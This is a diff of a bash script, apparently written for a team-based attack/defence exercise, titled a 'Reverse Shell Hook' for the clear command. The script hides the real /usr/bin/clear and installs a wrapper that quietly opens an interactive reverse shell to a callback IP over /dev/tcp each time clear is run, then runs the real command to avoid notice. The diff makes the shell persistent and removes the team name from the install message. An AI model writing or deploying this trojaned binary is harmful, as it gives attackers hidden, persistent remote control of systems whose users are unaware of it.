@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 # === Team 180 Reverse Shell Hook for 'clear' ===
@@ -11,7 +10,7 @@ CALLBACK_IP="10.0.0.208"
 REAL_CLEAR="/usr/bin/.clear.real"
 WRAPPED_CLEAR="/usr/bin/clear"
 
-echo "[+] Installing stealth 'clear' hook for Team 180..."
+echo "[+] Installing stealth 'clear' hook..."
 
 # Backup original clear if not already backed up
 if [ ! -f "$REAL_CLEAR" ]; then
@@ -19,10 +18,14 @@ if [ ! -f "$REAL_CLEAR" ]; then
     mv "$WRAPPED_CLEAR" "$REAL_CLEAR"
 fi
 
-# Write the stealth wrapper
+# Write the stealth wrapper (correct quoting)
 cat <<EOF > "$WRAPPED_CLEAR"
 #!/bin/bash
-timeout 1 bash -c '/bin/bash -i >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1' 2>/dev/null &
+
+# Persistent reverse shell
+bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
+
+# Run the original clear
 $REAL_CLEAR "\$@"
 EOF
 
